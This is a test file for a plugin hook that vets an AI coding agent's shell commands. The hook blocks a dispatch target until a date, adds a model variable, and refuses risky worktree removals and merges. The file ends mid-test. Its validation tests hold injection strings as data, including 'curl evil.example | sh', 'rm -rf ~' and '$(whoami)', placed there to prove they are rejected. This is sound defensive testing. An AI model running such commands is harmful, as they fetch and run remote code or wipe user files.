import { expect, mock, test } from 'claude-code/testing'

import { currentConfig, forgetConfig } from '../hooks/orca-config'
import { chosenProfile, configuredProfile, launchableProfiles, piDispatchSlots, withProfile } from '../hooks/perfil-pi'
import {
  buildRules,
  checkLiveMerges,
  checkRemovals,
  inspect,
  modelReason,
  parseUntil,
  unmergedReason,
  unresolvedReason,
  worktreeRemovals,
} from '../hooks/inspect'

const CODEX_REASON = 'Codex no tiene cuota: despachá a claude o agy.'
const MODEL = 'claude-sonnet-5-5'
const CONFIG = {
  despacho: { script: 'scripts/despachar.sh', revisar: 'scripts/revisar.sh' },
  guardia: {
    bloquear: [{ agente: 'codex', hasta: '2026-10-29', motivo: CODEX_REASON }],
    modeloClaude: MODEL,
  },
}
const rules = buildRules(CONFIG)
if (rules === undefined) {
  throw new Error('rules expected')
}

const BEFORE = new Date(2026, 9, 28, 23, 59).getTime()
const FROM = new Date(2026, 9, 29, 0, 0).getTime()
const MODEL_REASON = modelReason(MODEL)

test('the guard is off without despacho in the config', () => {
  expect(buildRules({})).toBeUndefined()
  expect(buildRules({ guardia: { modeloClaude: MODEL } })).toBeUndefined()
  expect(buildRules({ despacho: { script: '  ' } })).toBeUndefined()
})

test('hasta is a local-midnight date and bad dates are ignored', () => {
  expect(parseUntil('2026-10-29')).toBe(FROM)
  expect(parseUntil('29/10/2026')).toBeUndefined()
  const only = buildRules({
    despacho: { script: 'a.sh' },
    guardia: { bloquear: [{ agente: 'codex', hasta: 'mañana' }] },
  })
  expect(only?.blocks).toEqual([])
})

test('a block without motivo gets a default message', () => {
  const r = buildRules({
    despacho: { script: 'x/go.sh' },
    guardia: { bloquear: [{ agente: 'Codex', hasta: '2026-10-29' }] },
  })
  expect(inspect('./x/go.sh 5 codex', BEFORE, r!)).toEqual({
    kind: 'deny',
    reason: 'Codex está bloqueado hasta el 2026-10-29.',
  })
})

test('codex is denied until the date and allowed from it', () => {
  const lines = [
    './scripts/despachar.sh 582 codex',
    'scripts/revisar.sh 612 codex',
    'CODEX_ESFUERZO=high ./scripts/despachar.sh 582 codex',
    'bash scripts/despachar.sh 582 codex --reusar-agente',
  ]
  for (const line of lines) {
    expect(inspect(line, BEFORE, rules)).toEqual({ kind: 'deny', reason: CODEX_REASON })
    expect(inspect(line, FROM, rules)).toEqual({ kind: 'pass' })
  }
})

test('claude without the model is rewritten, with it passes, other model denied', () => {
  expect(inspect('./scripts/despachar.sh 582 claude', FROM, rules)).toEqual({
    kind: 'rewrite',
    command: `CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 582 claude`,
  })
  expect(inspect(`CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 582 claude`, FROM, rules)).toEqual({
    kind: 'pass',
  })
  expect(
    inspect(`export CLAUDE_MODELO=${MODEL} && ./scripts/despachar.sh 582 claude`, FROM, rules),
  ).toEqual({ kind: 'pass' })
  expect(inspect('CLAUDE_MODELO=claude-opus-4 ./scripts/despachar.sh 582 claude', FROM, rules)).toEqual({
    kind: 'deny',
    reason: MODEL_REASON,
  })
})

test('without modeloClaude claude passes untouched', () => {
  const noModel = buildRules({ despacho: { script: 'scripts/despachar.sh' } })
  expect(inspect('./scripts/despachar.sh 582 claude', FROM, noModel!)).toEqual({ kind: 'pass' })
})

test('agy, other scripts and non-invocations pass', () => {
  for (const line of [
    './scripts/despachar.sh 582 agy',
    'scripts/revisar.sh 612 agy',
    'grep despachar.sh docs/',
    'grep -rn "codex" scripts/revisar.sh',
    'cat scripts/revisar.sh',
    'git log --oneline',
    'echo "despachar.sh 5 codex"',
    './scripts/revisar.sh 612 claude',
  ]) {
    expect(inspect(line, BEFORE, rules)).toEqual({ kind: 'pass' })
  }
})

test('multi-command lines are inspected segment by segment', () => {
  expect(inspect('git pull && ./scripts/despachar.sh 5 codex', BEFORE, rules)).toEqual({
    kind: 'deny',
    reason: CODEX_REASON,
  })
  expect(
    inspect('git pull && ./scripts/despachar.sh 5 agy && ./scripts/despachar.sh 6 claude', FROM, rules),
  ).toEqual({
    kind: 'rewrite',
    command: `git pull && ./scripts/despachar.sh 5 agy && CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 6 claude`,
  })
  expect(inspect('echo hola; ./scripts/despachar.sh 7 claude | tee log', FROM, rules)).toEqual({
    kind: 'rewrite',
    command: `echo hola; CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 7 claude | tee log`,
  })
})

test('PowerShell gets the $env form of the rewrite', () => {
  expect(inspect('bash scripts/despachar.sh 5 claude', FROM, rules, 'powershell')).toEqual({
    kind: 'rewrite',
    command: `$env:CLAUDE_MODELO='${MODEL}'; bash scripts/despachar.sh 5 claude`,
  })
})

// The world beneath the plugin: a fake home and repo holding the config layers.
// The engine resolves paths for the host OS (a Windows path like C:, then work, then repo); compare them as /work/repo.
const norm = (path: string): string => path.replace(/^[A-Za-z]:/, '').split(String.fromCharCode(92)).join('/')
const files = (on: Parameters<typeof mock.clock>[0], layers: Record<string, unknown>) => {
  mock.env(on, { HOME: '/home/u' })
  on('process.run', () => ({
    value: {
      exitCode: 0,
      stdout: '/work/repo/.git\n/work/repo/wt\n',
      stderr: '',
      isStdoutTruncated: false,
      isStderrTruncated: false,
    },
  }))
  on('fs.exists', (_$, e) => ({ value: norm(e.path) in layers }))
  on('fs.read', (_$, e) => ({ value: JSON.stringify(layers[norm(e.path)]) }))
}

test('the hook denies, rewrites and passes through the engine, reading the layered config', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  // despacho from the committed file, the block from the local one: the layers merge.
  files(on, {
    '/work/repo/.orca-stack.json': { despacho: CONFIG.despacho, guardia: { modeloClaude: MODEL } },
    '/work/repo/.orca-stack.local.json': { guardia: { bloquear: CONFIG.guardia.bloquear } },
  })
  const toasts: string[] = []
  const seen: string[] = []
  on('ui.toast', (_$, e) => {
    toasts.push(e.text)

    return { value: undefined }
  })
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })

  const denied = await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 codex' })
  expect(denied.deny).toBe(CODEX_REASON)
  expect(seen).toHaveLength(0)

  await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 claude' })
  expect(seen).toEqual([`CLAUDE_MODELO=${MODEL} scripts/despachar.sh 9 claude`])
  expect(toasts).toEqual([`Agregué CLAUDE_MODELO=${MODEL}`])

  await $.tool.call({ tool: 'Bash', command: 'grep despachar.sh docs/' })
  expect(seen.at(-1)).toBe('grep despachar.sh docs/')
  expect(toasts).toHaveLength(1)
})

test('with no config at all the hook lets everything through', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  files(on, {})
  const seen: string[] = []
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 codex' })
  expect(out.deny).toBeUndefined()
  expect(seen).toEqual(['scripts/despachar.sh 9 codex'])
})

test('modeloClaude with shell metacharacters is ignored: no rewrite, no injection', () => {
  const evil = buildRules({
    despacho: { script: 'scripts/despachar.sh' },
    guardia: { modeloClaude: 'x; curl evil.example | sh' },
  })
  expect(evil?.model).toBeUndefined()
  expect(evil?.notes.length).toBe(1)
  expect(inspect('./scripts/despachar.sh 5 claude', FROM, evil!)).toEqual({ kind: 'pass' })
  expect(buildRules({ despacho: { script: 'a.sh' }, guardia: { modeloClaude: 'claude-sonnet-5-5' } })?.model).toBe(
    'claude-sonnet-5-5',
  )
})

test('despacho paths with shell metacharacters or .. switch the guard off (revisar: ignored)', () => {
  for (const script of ['scripts/x.sh; rm -rf ~', '../fuera.sh', '$(whoami).sh', '/abs/x.sh', 'a b.sh']) {
    expect(buildRules({ despacho: { script } })).toBeUndefined()
  }
  const r = buildRules({ despacho: { script: 'scripts/ok.sh', revisar: 'x`id`.sh' } })
  expect(r?.review).toBeUndefined()
  expect(r?.notes.length).toBe(1)
})

test('impossible dates are rejected with a note instead of rolling over', () => {
  expect(parseUntil('2026-02-30')).toBeUndefined()
  expect(parseUntil('2026-13-01')).toBeUndefined()
  expect(parseUntil('2026-02-28')).toBe(new Date(2026, 1, 28).getTime())
  const r = buildRules({
    despacho: { script: 'a.sh' },
    guardia: { bloquear: [{ agente: 'codex', hasta: '2026-02-30' }] },
  })
  expect(r?.blocks).toEqual([])
  expect(r?.notes[0]).toContain('codex')
})

test('the config memory is keyed by repo root: another checkout never gets the previous rules', async () => {
  forgetConfig()
  const host = (root: string, rules: unknown) => ({
    home: async () => '/home/u',
    exists: async (path: string) => path.endsWith(`${root}/.orca-stack.json`),
    read: async () => JSON.stringify(rules),
    git: async () => ({ exitCode: 0, stdout: `${root}/.git\n${root}\n` }),
    now: async () => 1000,
  })
  const a = await currentConfig(host('/work/a', { despacho: { script: 'a.sh' } }))
  const b = await currentConfig(host('/work/b', { despacho: { script: 'b.sh' } }))
  expect(a.despacho?.script).toBe('a.sh')
  expect(b.despacho?.script).toBe('b.sh')
  forgetConfig()
})

const PORCELAIN =
  'worktree C:/r/repo\nHEAD aaa\nbranch refs/heads/main\n\n' +
  'worktree C:/r/ws/issue-5\nHEAD bbb\nbranch refs/heads/me/5-fix\n\n' +
  'worktree C:/r/ws/issue-6\nHEAD ccc\ndetached\n'

test('worktreeRemovals finds orca and git removals in bash and PowerShell forms only', () => {
  expect(worktreeRemovals('orca worktree rm --worktree branch:me/5-fix --json')).toEqual([{ by: 'branch', value: 'me/5-fix' }])
  expect(worktreeRemovals('orca worktree rm --worktree=issue:5')).toEqual([{ by: 'issue', value: '5' }])
  const bs = String.fromCharCode(92)
  expect(worktreeRemovals(`orca.cmd worktree rm --worktree "path:C:${bs}r${bs}ws${bs}issue-5"`)).toEqual([
    { by: 'path', value: `C:${bs}r${bs}ws${bs}issue-5` },
  ])
  expect(worktreeRemovals('git -C ../repo worktree remove -f C:/r/ws/issue-5')).toEqual([{ by: 'path', value: 'C:/r/ws/issue-5', repo: '../repo' }])
  expect(worktreeRemovals(`cd x; & git worktree remove ..${bs}ws${bs}issue-5`)).toEqual([{ by: 'path', value: `..${bs}ws${bs}issue-5`, repo: 'x' }])
  expect(worktreeRemovals('orca worktree rm')).toEqual([{ by: 'none', value: '' }])
  for (const line of ['orca worktree ps --json', 'git worktree list', 'echo "orca worktree rm"', 'grep -r "git worktree remove" docs/']) {
    expect(worktreeRemovals(line)).toEqual([])
  }
})

// Orca links issue 5 to ws/issue-5 and issue 7 to ws/issue-6 (the folder name says nothing about the link).
const PS = JSON.stringify({
  result: {
    worktrees: [
      { path: 'C:/r/ws/issue-5', linkedIssue: 5 },
      { path: 'C:/r/ws/issue-6', linkedIssue: 7 },
      { path: 'C:/other/repo/issue-9', linkedIssue: 9 },
    ],
  },
})

type FakeOpts = { listFails?: boolean; logFails?: boolean; dirty?: string; statusFails?: boolean; psFails?: boolean; porcelain?: string }

const fakeGit = (unmerged: string, opts: FakeOpts = {}) => {
  const calls: string[][] = []
  const git = async (argv: string[]) => {
    calls.push(argv)
    if (argv[0] === 'orca') {
      return { exitCode: opts.psFails === true ? 1 : 0, stdout: PS }
    }
    if (argv[3] === 'status') {
      return { exitCode: opts.statusFails === true ? 128 : 0, stdout: opts.dirty ?? '' }
    }
    if (argv[2] === 'list') {
      return { exitCode: opts.listFails === true ? 1 : 0, stdout: opts.porcelain ?? PORCELAIN }
    }

    return { exitCode: opts.logFails === true ? 128 : 0, stdout: unmerged }
  }

  return { git, calls }
}

test('a worktree whose branch has commits outside every remote is denied, naming them', async () => {
  const { git, calls } = fakeGit('abc1234 feat: algo\ndef5678 fix: otro\n')
  const reason = await checkRemovals('orca worktree rm --worktree issue:5', git)
  expect(reason).toBe(unmergedReason('me/5-fix', ['abc1234 feat: algo', 'def5678 fix: otro']))
  expect(reason).toContain('OK del humano')
  expect(calls.find(call => call[1] === 'log')).toEqual(['git', 'log', 'refs/heads/me/5-fix', '--not', '--remotes', '--oneline'])
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', git)).toContain('abc1234')
})

test('a published branch, a detached worktree and non-removals pass', async () => {
  const clean = fakeGit('')
  expect(await checkRemovals('orca worktree rm --worktree branch:me/5-fix', clean.git)).toBeUndefined()
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('x y').git)).toBeUndefined()
  const none = fakeGit('x y')
  expect(await checkRemovals('orca worktree ps --json && git status', none.git)).toBeUndefined()
  expect(none.calls).toEqual([])
})

test('anything git cannot resolve is denied (fail closed)', async () => {
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { listFails: true }).git)).toContain('No pude')
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { logFails: true }).git)).toContain('falló')
  expect(await checkRemovals('orca worktree rm --worktree issue:99', fakeGit('').git)).toContain('no encuentro')
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { psFails: true }).git)).toContain('orca worktree ps falló')
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', fakeGit('', { statusFails: true }).git)).toContain('git status')
  expect(await checkRemovals('orca worktree rm', fakeGit('').git)).toContain('sin selector')
  const boom = async (): Promise<never> => {
    throw new Error('sin git')
  }
  expect(await checkRemovals('git worktree remove x', boom)).toContain('no pude correr git')
})

const mergeWorld = (opts: {
  pr?: { headRefName?: string; closingIssuesReferences?: { number: number }[]; body?: string }
  worktrees?: { path: string; linkedIssue?: number; agents?: { state?: string; agentType?: string }[] }[]
  fail?: 'gh' | 'orca' | 'malformed-gh' | 'malformed-orca'
} = {}) => {
  const calls: string[][] = []
  const git = async (argv: string[]) => {
    calls.push(argv)
    if (argv[0] === 'git' && argv[1] === 'remote') {
      return { exitCode: 0, stdout: 'https://github.com/Gagaismo/orca-stack.git\n' }
    }
    if (argv[0] === 'gh') {
      if (opts.fail === 'gh') return { exitCode: 1, stdout: '' }
      if (opts.fail === 'malformed-gh') return { exitCode: 0, stdout: '{' }

      return { exitCode: 0, stdout: JSON.stringify(opts.pr ?? { headRefName: 'Gagaismo/orca-stack-220', closingIssuesReferences: [{ number: 220 }], body: '' }) }
    }
    if (argv[0] === 'git' && argv[1] === 'worktree') {
      return { exitCode: 0, stdout: 'worktree C:/r/repo\nbranch refs/heads/main\n\nworktree C:/r/ws/issue-220\nbranch refs/heads/Gagaismo/orca-stack-220\n' }
    }
    if (argv[0] === 'orca') {
      if (opts.fail === 'orca') return { exitCode: 1, stdout: '' }
      if (opts.fail === 'malformed-orca') return { exitCode: 0, stdout: '{' }

      return {
        exitCode: 0,
        stdout: JSON.stringify({ result: { worktrees: opts.worktrees ?? [{ path: 'C:/r/ws/issue-220', linkedIssue: 220, agents: [{ state: 'working', agentType: 'codex' }] }] } }),
      }
    }

    return { exitCode: 1, stdout: '' }
  }

  return { git, calls }
}

test('Rule 1: merge forms resolve the PR worker by closing issue, body, then local branch', async () => {
  const byClosingIssue = mergeWorld()
  expect(await checkLiveMerges('gh pr merge 222 --merge', byClosingIssue.git)).toContain('PR #222 (codex, #220)')
  expect(byClosingIssue.calls).toContainEqual(['gh', 'pr', 'view', '222', '--json', 'headRefName,closingIssuesReferences,body'])
  expect(byClosingIssue.calls).toContainEqual(['orca', 'worktree', 'ps', '--json'])

  const byBody = mergeWorld({ pr: { headRefName: 'some-branch', closingIssuesReferences: [], body: 'Closes #220' } })
  expect(await checkLiveMerges('gh pr merge --squash 222', byBody.git)).toContain('PR #222')

  const byBranch = mergeWorld({ pr: { headRefName: 'Gagaismo/orca-stack-220', closingIssuesReferences: [], body: '' }, worktrees: [{ path: 'C:/r/ws/issue-220', agents: [{ state: 'working', agentType: 'codex' }] }] })
  expect(await checkLiveMerges('echo start && gh.exe pr merge --merge 222', byBranch.git)).toContain('PR #222')

  const bySingleAmpersand = mergeWorld()
  expect(await checkLiveMerges('echo start & gh pr merge 222 --merge', bySingleAmpersand.git)).toContain('PR #222')
})

test('Rule 2: every live worker state blocks, case-insensitively', async () => {
  for (const state of ['working', 'running', 'active', 'blocked', 'waiting', 'BLOCKED']) {
    const world = mergeWorld({ worktrees: [{ path: 'C:/r/ws/issue-220', linkedIssue: 220, agents: [{ state, agentType: 'codex' }] }] })
    expect(await checkLiveMerges('gh pr merge 222', world.git), state).toContain(`(${state.toLowerCase()})`)
  }
})

test('Rule 3: done, missing, and unrecorded Pi workers do not block', async () => {
  for (const agents of [[{ state: 'done', agentType: 'codex' }], [], [{ state: 'done', agentType: 'pi' }]]) {
    const world = mergeWorld({ worktrees: [{ path: 'C:/r/ws/issue-220', linkedIssue: 220, agents }] })
    expect(await checkLiveMerges('gh pr merge 222', world.git)).toBeUndefined()
  }
  expect(await checkLiveMerges('gh pr merge 222', mergeWorld({ worktrees: [] }).git)).toBeUndefined()
})

test('Rule 4: a failed or malformed GitHub or Orca read fails open', async () => {
  for (const fail of ['gh', 'orca', 'malformed-gh', 'malformed-orca'] as const) {
    expect(await checkLiveMerges('gh pr merge 222', mergeWorld({ fail }).git), fail).toBeUndefined()
  }
})

test('Rule 5: an explicitly named different repo is allowed without lookup', async () => {
  const world = mergeWorld()
  expect(await checkLiveMerges('gh pr merge 222 -R owner/another-repo', world.git)).toBeUndefined()
  expect(world.calls.filter(argv => argv[0] === 'gh' || argv[0] === 'orca')).toHaveLength(0)
})

test('Rule 5: explicit same-repo flags still use the worker lock', async () => {
  expect(await checkLiveMerges('gh -R Gagaismo/orca-stack pr merge 222 --merge', mergeWorld().git)).toContain('PR #222')
})

test('Rule 6: Bash and PowerShell tool calls both deny a live PR worker', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  mock.env(on, { HOME: '/home/u' })
  on('fs.exists', () => ({ value: false }))
  const calls: string[][] = []
  on('process.run', (_$, e) => {
    calls.push(e.argv)
    const stdout = e.argv[0] === 'gh'
      ? JSON.stringify({ headRefName: 'Gagaismo/orca-stack-220', closingIssuesReferences: [{ number: 220 }], body: '' })
      : e.argv[0] === 'orca'
        ? JSON.stringify({ result: { worktrees: [{ path: 'C:/r/ws/issue-220', linkedIssue: 220, agents: [{ state: 'working', agentType: 'codex' }] }] } })
        : e.argv[1] === 'remote'
          ? 'https://github.com/Gagaismo/orca-stack.git\n'
          : 'worktree C:/r/repo\nbranch refs/heads/main\n\nworktree C:/r/ws/issue-220\nbranch refs/heads/Gagaismo/orca-stack-220\n'

    return { value: { exitCode: 0, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  const seen: string[] = []
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })
  on('tool.call', { tool: 'PowerShell' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })

  const bash = await $.tool.call({ tool: 'Bash', command: 'gh pr merge 222 --merge' })
  const powershell = await $.tool.call({ tool: 'PowerShell', command: 'gh.exe pr merge 222 --merge' })
  expect(bash.deny).toContain('El worker del PR #222 (codex, #220) sigue trabajando (working)')
  expect(powershell.deny).toBe(bash.deny)
  expect(seen).toEqual([])
  expect(calls.filter(argv => argv[0] === 'orca')).toHaveLength(2)
})

// Two repos: the session runs in one, the scratch worktree belongs to the other (the 2026-10-10 incident).
// `claude plugin test` has no process, so this git answers as the real one would in each repo: by `-C <dir>`.
const SESSION = 'C:/u/Documents/orca-stack'
const OTHER = 'C:/u/Documents/other-repo'
const SCRATCH = 'C:/u/AppData/Local/Temp/claude/scratchpad/init-other-repo'
const SCRATCH_BRANCH = 'chore/orca-stack-v0.7.0'

type RepoState = { porcelain: string; unpushed: Record<string, string> }

const twoRepos = (opts: { dirty?: string; unpushed?: string } = {}) => {
  const repos: Record<string, RepoState> = {
    [SESSION]: { porcelain: `worktree ${SESSION}\nHEAD aaa\nbranch refs/heads/main\n`, unpushed: { main: '' } },
    [OTHER]: {
      porcelain: `worktree ${OTHER}\nHEAD bbb\nbranch refs/heads/main\n\nworktree ${SCRATCH}\nHEAD ccc\nbranch refs/heads/${SCRATCH_BRANCH}\n`,
      unpushed: { main: '', [SCRATCH_BRANCH]: opts.unpushed ?? '' },
    },
  }
  const calls: string[][] = []
  const git = async (argv: string[]) => {
    calls.push(argv)
    const [, flag, dir] = argv
    const where = flag === '-C' ? (dir ?? '') : SESSION
    const rest = flag === '-C' ? argv.slice(3) : argv.slice(1)
    if (rest[0] === 'status') {
      return { exitCode: where === SCRATCH || repos[where] !== undefined ? 0 : 128, stdout: where === SCRATCH ? (opts.dirty ?? '') : '' }
    }
    const repo = repos[where]
    if (repo === undefined) {
      return { exitCode: 128, stdout: '' } // fatal: not a git repository
    }
    if (rest[0] === 'worktree' && rest[1] === 'list') {
      return { exitCode: 0, stdout: repo.porcelain }
    }
    const unpushed = repo.unpushed[(rest[1] ?? '').replace(/^refs\/heads\//, '')]

    return unpushed === undefined ? { exitCode: 128, stdout: '' } : { exitCode: 0, stdout: unpushed } // unknown revision
  }

  return { git, calls }
}

test('rule 1: a clean, pushed worktree of another repo can be removed with git -C', async () => {
  const { git, calls } = twoRepos()
  expect(await checkRemovals(`git -C ${OTHER} worktree remove ${SCRATCH}`, git)).toBeUndefined()
  expect(calls).toContainEqual(['git', '-C', OTHER, 'worktree', 'list', '--porcelain'])
  expect(calls).toContainEqual(['git', '-C', OTHER, 'log', `refs/heads/${SCRATCH_BRANCH}`, '--not', '--remotes', '--oneline'])
})

test('rule 2: cd <repo> && git worktree remove resolves against <repo>', async () => {
  expect(await checkRemovals(`cd ${OTHER} && git worktree remove ${SCRATCH}`, twoRepos().git)).toBeUndefined()
  expect(await checkRemovals(`cd "${OTHER}"; git worktree remove ${SCRATCH}`, twoRepos().git)).toBeUndefined()
  expect(await checkRemovals(`cd C:/u/Documents && git -C other-repo worktree remove ${SCRATCH}`, twoRepos().git)).toBeUndefined()
})

test('rule 3: a worktree of another repo with uncommitted changes is denied', async () => {
  for (const form of [`git -C ${OTHER} worktree remove ${SCRATCH}`, `cd ${OTHER} && git worktree remove ${SCRATCH}`]) {
    expect(await checkRemovals(form, twoRepos({ dirty: ' M src/a.ts\n' }).git), form).toContain('cambios sin commitear')
  }
})

test('rule 4: a worktree of another repo with commits on no remote is denied, naming them', async () => {
  for (const form of [`git -C ${OTHER} worktree remove ${SCRATCH}`, `cd ${OTHER} && git worktree remove ${SCRATCH}`]) {
    const reason = await checkRemovals(form, twoRepos({ unpushed: 'abc1234 wip\n' }).git)
    expect(reason, form).toBe(unmergedReason(SCRATCH_BRANCH, ['abc1234 wip']))
  }
})

test('rule 5: a -C or cd target that is a variable or glob stays unresolved and is denied', async () => {
  for (const form of [`git -C $REPO worktree remove ${SCRATCH}`, `cd "$d" && git worktree remove ${SCRATCH}`, `cd ${OTHER}* && git worktree remove ${SCRATCH}`, `cd && git worktree remove ${SCRATCH}`, `cd - && git worktree remove ${SCRATCH}`]) {
    const { git, calls } = twoRepos()
    expect(await checkRemovals(form, git), form).toContain('no puedo resolver el repo')
    expect(calls, form).toEqual([])
  }
})

test('rule 6: a -C that is not a git repo is denied as unresolved', async () => {
  const reason = await checkRemovals(`git -C C:/u/Downloads worktree remove ${SCRATCH}`, twoRepos().git)
  expect(reason).toBe(unresolvedReason('git worktree list en C:/u/Downloads falló'))
})

test('rule 7: without -C or cd the session cwd is used, as before', async () => {
  const { git, calls } = twoRepos()
  expect(await checkRemovals(`git worktree remove ${SCRATCH}`, git)).toContain(`no encuentro el worktree ${SCRATCH}`)
  expect(calls).toEqual([['git', 'worktree', 'list', '--porcelain']])
})

test('the hook denies a worktree removal through the engine even with no config', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  mock.env(on, { HOME: '/home/u' })
  on('fs.exists', () => ({ value: false }))
  on('process.run', (_$, e) => ({
    value: {
      exitCode: 0,
      stdout: e.argv[0] === 'orca' ? PS : e.argv[3] === 'status' ? '' : e.argv[2] === 'list' ? PORCELAIN : e.argv[0] === 'git' && e.argv[1] === 'log' ? 'abc1234 wip\n' : '/work/repo/.git\n/work/repo\n',
      stderr: '',
      isStdoutTruncated: false,
      isStderrTruncated: false,
    },
  }))
  const seen: string[] = []
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca worktree rm --worktree issue:5' })
  expect(out.deny).toContain('abc1234 wip')
  expect(seen).toHaveLength(0)
  await $.tool.call({ tool: 'Bash', command: 'git status' })
  expect(seen).toEqual(['git status'])
})

test('removals are found anywhere in a segment: loops, if, foreach, sudo, xargs', () => {
  const forms = [
    'for w in a b; do orca worktree rm --worktree "$w"; done',
    'if true; then orca worktree rm --worktree issue:5; fi',
    'foreach ($w in $x) { orca worktree rm --worktree $w }',
    'foreach ($w in $x) {orca worktree rm --worktree "$w"}',
    'sudo orca worktree rm --worktree issue:5',
    'ls | xargs orca worktree rm',
    'ls | xargs -n1 git worktree remove',
    'while read w; do git -C /r worktree remove "$w"; done',
  ]
  for (const form of forms) {
    expect(worktreeRemovals(form).length, form).toBeGreaterThan(0)
  }
  // Loop variables cannot be resolved: no target is named.
  expect(worktreeRemovals('for w in a; do orca worktree rm --worktree "$w"; done')).toEqual([{ by: 'none', value: '$w' }])
  expect(worktreeRemovals('ls | xargs orca worktree rm')).toEqual([{ by: 'none', value: '' }])
  expect(worktreeRemovals('if true; then orca worktree rm --worktree issue:5; fi')).toEqual([{ by: 'issue', value: '5' }])
  for (const quoted of ['echo "orca worktree rm"', `echo 'for w in x; do git worktree remove "$w"; done'`, 'echo "a; orca worktree rm --worktree issue:5"']) {
    expect(worktreeRemovals(quoted), quoted).toEqual([])
  }
})

test('a shell given the removal as text is opaque; -EncodedCommand always is', () => {
  const opaque = [
    `bash -c 'for w in a; do orca worktree rm --worktree "$w"; done'`,
    `sh -lc 'cd x; orca worktree rm --worktree issue:5'`,
    'pwsh -Command "foreach ($w in $x) { git worktree remove $w }"',
    'powershell -NoProfile -Command "orca worktree rm --worktree issue:5"',
    'pwsh -EncodedCommand ZQBjAGgAbwA=',
    'cmd /c "git worktree remove x"',
    'iex "orca worktree rm --worktree issue:5"',
  ]
  for (const form of opaque) {
    expect(worktreeRemovals(form).map(one => one.by), form).toEqual(['opaque'])
  }
  expect(worktreeRemovals(`bash -c 'ls -la'`)).toEqual([])
  expect(worktreeRemovals('bash script.sh')).toEqual([])
})

test('the guard denies every form whose target cannot be resolved', async () => {
  const forms = [
    'for w in a b; do orca worktree rm --worktree "$w"; done',
    'foreach ($w in $x) { orca worktree rm --worktree $w }',
    'ls | xargs orca worktree rm',
    `bash -c 'orca worktree rm --worktree issue:5'`,
    'pwsh -Command "git worktree remove x"',
    'pwsh -EncodedCommand ZQBjAGgAbwA=',
  ]
  for (const form of forms) {
    expect(await checkRemovals(form, fakeGit('').git), form).toContain('OK del humano')
  }
  expect(await checkRemovals('echo "orca worktree rm --worktree issue:5"', fakeGit('').git)).toBeUndefined()
  // A resolvable target inside an if/then body still gets the usual checks.
  expect(await checkRemovals('if true; then orca worktree rm --worktree issue:5; fi', fakeGit('abc1234 wip').git)).toContain('abc1234')
})

test('issue:N is resolved by the linked issue, as Orca does, not by the folder name', async () => {
  const clean = fakeGit('')
  // issue:7 is linked to ws/issue-6 (detached, nothing to lose); no folder is called issue-7.
  expect(await checkRemovals('orca worktree rm --worktree issue:7', clean.git)).toBeUndefined()
  expect(clean.calls.some(call => call.join(' ') === 'orca worktree ps --json')).toBe(true)
  // issue:6 has a folder issue-6 but no link: not found, denied.
  expect(await checkRemovals('orca worktree rm --worktree issue:6', fakeGit('').git)).toContain('no encuentro')
  // a link in another repo is not this repo's worktree
  expect(await checkRemovals('orca worktree rm --worktree issue:9', fakeGit('').git)).toContain('no encuentro')
})

test('uncommitted changes deny the removal; untracked .atl/ does not count', async () => {
  const dirty = await checkRemovals('orca worktree rm --worktree branch:me/5-fix', fakeGit('', { dirty: ' M src/a.ts\n?? notes.md\n' }).git)
  expect(dirty).toContain('cambios sin commitear')
  expect(dirty).toContain('src/a.ts')
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('', { dirty: ' M x\n' }).git)).toContain('cambios sin commitear')
  const atl = fakeGit('', { dirty: '?? .atl/\n?? .atl/skill-registry.md\n' })
  expect(await checkRemovals('orca worktree rm --worktree branch:me/5-fix', atl.git)).toBeUndefined()
  expect(atl.calls.find(call => call[3] === 'status')).toEqual(['git', '-C', 'C:/r/ws/issue-5', 'status', '--porcelain'])
})

test('a quoted executable is still a removal; quoted text is not', async () => {
  const bs = String.fromCharCode(92)
  const forms = [
    `& "C:${bs}Program Files${bs}Orca${bs}orca.exe" worktree rm --worktree branch:x`,
    `& "C:${bs}Program Files${bs}Git${bs}cmd${bs}git.exe" worktree remove ..${bs}ws${bs}x`,
    '"orca" worktree rm --worktree branch:x',
    `pwsh -Command "& 'C:${bs}Program Files${bs}Orca${bs}orca.exe' worktree rm --worktree branch:x"`,
  ]
  for (const form of forms) {
    expect(worktreeRemovals(form).length, form).toBeGreaterThan(0)
    expect(await checkRemovals(form, fakeGit('').git), form).toContain('OK del humano')
  }
  expect(worktreeRemovals(forms[0] ?? '')).toEqual([{ by: 'branch', value: 'x' }])
  expect(worktreeRemovals('echo "orca worktree rm --worktree branch:x"')).toEqual([])
})

test('every -EncodedCommand abbreviation is denied, and -ExecutionPolicy is not one', () => {
  for (const flag of ['-e', '-en', '-enc', '-enco', '-encodedc', '-EncodedCommand', '-ec', '-EC']) {
